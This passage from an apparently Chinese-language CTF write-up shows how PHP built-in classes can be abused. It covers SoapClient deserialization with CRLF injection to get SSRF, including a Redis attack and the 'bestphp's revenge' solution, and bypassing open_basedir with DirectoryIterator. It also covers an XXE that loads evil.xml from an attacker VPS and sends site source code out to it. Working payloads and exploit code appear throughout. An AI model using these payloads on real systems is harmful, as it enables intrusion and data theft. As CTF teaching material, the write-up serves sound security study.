    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
执行代码后，如下图所示，成功插入了Redis命令：
这样我们就可以利用HTTP协议去攻击Redis了。
对于如何发送POST的数据包，这里面还有一个坑，就是 `Content-Type` 的设置，因为我们要提交的是POST数据 `Content-Type`
的值我们要设置为 `application/x-www-form-urlencoded`，这里如何修改 `Content-Type` 的值呢？由于
`Content-Type` 在 `User-Agent` 的下面，所以我们可以通过 `SoapClient` 来设置 `User-Agent` ，将原来的
`Content-Type` 挤下去，从而再插入一个新的 `Content-Type` 。
测试代码如下：
     $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
    $b = serialize($a);
    $b = str_replace('^^',"\n\r",$b);
    echo $b;
    $c = unserialize($b);
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
    ?>
执行代码后，如下图所示，成功发送POST数据：
### bestphp's revenge
bestphp's revenge 这道题利用的就是这个点，即对 SoapClient 类进行反序列化触发 SSRF，并配合CRLF构造payload。
进入题目，给出源码：
扫描目录发现flag.php：
可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。
但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。
写出最后的POC：
     $target,
        'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
        'uri' => "123"));
    $payload = urlencode(serialize($attack));
    echo $payload;
生成payload：
    O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为
`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的session中。
然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有
`ini_set()` 这个函数来更改 `session.serialize_handler`
的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造
`session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的
`call_user_func($_GET['f'], $_POST);`
函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现
`session_start(serialize_handler=php_serialize)`
的调用来修改此页面的序列化引擎为php_serialize。
所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：
此时，我们成功将我们php原生类SoapClient构造的payload传入了 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`
的session中，当页面重新加载时，就会自动将其反序列化。但此时还不会触发SSRF，需要触发 `__call`
方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：
    $a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
    call_user_func($b, $a);
我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：
    call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018'));
call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。
这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发
`__call` 方法，造成ssrf去访问flag.php。
所以我们第二次传参如下：
最后，我们第三次传参，用我们POC里面自己设置的cookie（`PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4`）去访问这个页面，`var_dump($_SESSION);`
会将 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的这个session内容输出出来，即可得到flag：
## 使用 DirectoryIterator 类绕过 open_basedir
DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。
DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。
测试代码：
    // test.php
    __toString().'');
    }
    ?>
    # payload一句话的形式:
    $a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'');}
我们输入 `/?whoami=glob:///*` 即可列出根目录下的文件：
但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。
## 使用 SimpleXMLElement 类进行 XXE
SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。
### SimpleXMLElement
官方文档中对于SimpleXMLElement 类的构造方法 `SimpleXMLElement::__construct` 的定义如下：
可以看到通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数
data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。
这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。
### [SUCTF 2018]Homework
进入题目，随便注册一个账号，登录作业平台。看到一个 `calc` 计算器类的代码。有两个按钮，一个用于调用 `calc`
类实现两位数的四则运算。另一个用于上传文件，提交代码。
`calc` 计算器类的代码为：
我们点击calc按钮，计算2+2=4，我们观察url处的参数，再结合`calc`计算器类的代码可知module为调用的类，args为类的构造方法的参数：
所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。
首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。
evil.xml：
    %remote;
    %all;
    %send;
    ]>
send.xml：
    ">
send.php：
然后在url中构造如下：
    /show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。
如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：
后续解题过程就不写了。
## Ending......
文中若有不足之处，还请各位大佬多多点评。  
我的博客：